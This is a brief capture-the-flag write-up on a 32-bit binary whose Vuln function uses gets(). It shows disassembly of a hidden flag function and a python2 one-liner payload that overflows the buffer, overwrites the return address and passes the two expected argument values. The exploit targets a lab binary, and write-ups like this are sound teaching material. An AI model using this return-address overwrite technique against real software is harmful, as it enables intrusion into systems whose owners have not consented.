    I used Ghidra and pwndbg to debug this
    
    when the code is disassembled using GHIDRA, we could see Vuln function has "gets" that is vulnerable to buffer overflow vulnerability.
    
    we could see function called flag which is a deadcode in the binary that prints the flag information
    
    We just need to craft the payload in such a way that the return pointer gets overwritten by the address of the "flag" function
    
    As the buffer size is 184 bytes + 4 bytes of ebp to overwrite and the flag has the address "0x080491e2" , we will be able to overwrite the return pointer with the 
    address of the flag function.
    
    As ASLR is turned off , we can hardcode the address of the flag function into the payload , that made things even easier
    
    But on Analysing the disassembled code of flag function , we could see that the paramters passed to flag should have "$0xdeadbeef" and "$0xc0ded00d" to print the 
    flag to the output
    
     0x0804923e <+92>:    call   0x8049050 <fgets@plt>
   0x08049243 <+97>:    add    $0x10,%esp
   0x08049246 <+100>:   cmpl   $0xdeadbeef,0x8(%ebp)
   0x0804924d <+107>:   jne    0x8049269 <flag+135>
   0x0804924f <+109>:   cmpl   $0xc0ded00d,0xc(%ebp)
   0x08049256 <+116>:   jne    0x804926c <flag+138>
   0x08049258 <+118>:   sub    $0xc,%esp
   0x0804925b <+121>:   lea    -0x4c(%ebp),%eax
   0x0804925e <+124>:   push   %eax
   0x0804925f <+125>:   call   0x8049030 <printf@plt>
   0x08049264 <+130>:   add    $0x10,%esp
    
    So , I have crafted a payload in python2 as follows
    
    python2 -c "print('A'*188 + '\xe2\x91\x04\x08' + 'B'*4 + '\xef\xbe\xad\xde'+'\x0d\xd0\xde\xc0')")
    
    and the flag is printed to the screen
    
    A pwntools script in python3 is provided for the same
